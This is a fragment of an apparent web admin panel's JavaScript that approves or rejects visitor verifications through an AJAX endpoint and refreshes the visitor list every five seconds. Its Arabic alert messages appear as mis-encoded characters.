                    alert(`ØªÙ… ${status === 'approved' ? 'Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©' : 'Ø§Ù„Ø±ÙØ¶'} Ø¨Ù†Ø¬Ø§Ø­!`);
                    loadVisitors();
                },
                error: function() {
                    alert('Ø­Ø¯Ø« Ø®Ø·Ø£!');
                }
            });
        }
        
        // Approve/Reject Verification
        function approveVerification(vid, status) {
            if (!confirm(`Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† ${status === 'approved' ? 'Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©' : 'Ø§Ù„Ø±ÙØ¶'}?`)) return;
            
            $.ajax({
                url: `/admin/api/approve-verification`,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ vid, status }),
                success: function() {
                    alert(`ØªÙ… ${status === 'approved' ? 'Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©' : 'Ø§Ù„Ø±ÙØ¶'} Ø¨Ù†Ø¬Ø§Ø­!`);
                    loadVisitors();
                },
                error: function() {
                    alert('Ø­Ø¯Ø« Ø®Ø·Ø£!');
                }
            });
        }
        
        // Load on page load
        $(document).ready(function() {
            loadVisitors();
            
            // Auto-refresh every 5 seconds (balanced)
            setInterval(function() {
                loadVisitors();
            }, 5000);
        });
    </script>
</body>
</html>
